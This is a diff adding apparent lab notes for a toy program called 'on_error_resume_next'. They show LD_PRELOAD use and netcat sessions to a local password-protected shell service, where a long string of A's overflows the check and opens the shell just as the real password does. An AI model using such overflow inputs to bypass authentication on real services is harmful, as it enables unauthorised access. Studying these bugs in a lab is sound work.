@@ -1,0 +1,40 @@
+gcc version 4.6.3 (Ubuntu/Linaro 4.6.3-1ubuntu5) 
+gcc version 4.9.2 (Debian 4.9.2-16)
+
+
+LD_PRELOAD=./liboern.so ./login
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+
+
+
+
+jeff@gracel:~/Desktop/share/random/on_error_resume_next$ nc localhost 5555
+Please enter the password:
+JEFFBALL
+Password correct, starting access shell...
+id
+uid=1000(jeff) gid=1000(jeff) groups=1000(jeff),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
+exit
+jeff@gracel:~/Desktop/share/random/on_error_resume_next$
+
+
+
+
+jeff@gracel:~/Desktop/share/random/on_error_resume_next$ nc localhost 5555
+Please enter the password:
+NOT_RIGHT
+jeff@gracel:~/Desktop/share/random/on_error_resume_next$
+
+
+
+
+jeff@gracel:~/Desktop/share/random/on_error_resume_next$ nc localhost 5555
+Please enter the password:
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Password correct, starting access shell...
+id
+uid=1000(jeff) gid=1000(jeff) groups=1000(jeff),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
+exit
+jeff@gracel:~/Desktop/share/random/on_error_resume_next$ 
+
